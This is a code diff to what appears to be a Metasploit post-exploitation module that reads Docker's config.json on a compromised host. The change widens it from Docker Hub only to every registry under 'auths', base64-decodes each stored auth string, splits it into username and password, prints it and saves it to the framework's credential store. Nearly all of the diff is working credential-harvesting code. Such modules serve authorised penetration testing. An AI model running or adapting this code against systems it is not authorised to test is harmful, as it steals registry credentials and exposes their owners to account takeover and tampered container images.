@@ -57,15 +57,34 @@ class MetasploitModule < Msf::Post
   def extract(target)
     file = read_file(target)
     parsed = JSON.parse(file)
-    if parsed["auths"] && parsed["auths"]["https://index.docker.io/v1/"]
-      creds = parsed["auths"]["https://index.docker.io/v1/"]["auth"]
+    if parsed["auths"]
+      parsed["auths"].each do |key, value|
+        vprint_status("key: #{key}")
+        value.each do |k,v|
+          if k == "auth"
+            plain = Rex::Text.decode_base64(v)
+            if plain.include? ":"
 
-      if creds.length > 0
-        plain = Rex::Text.decode_base64(creds)
-        print_good("Found #{plain}")
-        loot_path = store_loot("docker.credentials", "text/plain", session, plain,
-          "config.json", "Docker credentials from #{target}")
-        print_good("Saved credentials to #{loot_path}")
+              print_good("Found #{plain}")
+              username, password = plain.split(':')
+              credential_data = {
+                origin_type: :import,
+              module_fullname: self.fullname,
+              filename: target,
+              workspace_id: myworkspace_id,
+              service_name: 'docker',
+              realm_value: key,
+              realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+              private_type: :password,
+              private_data: password,
+              username: username
+            }
+            create_credential(credential_data)
+
+            print_good("Saved credentials")
+            end
+          end
+        end
       end
     else
       print_status("No credentials found in config file")
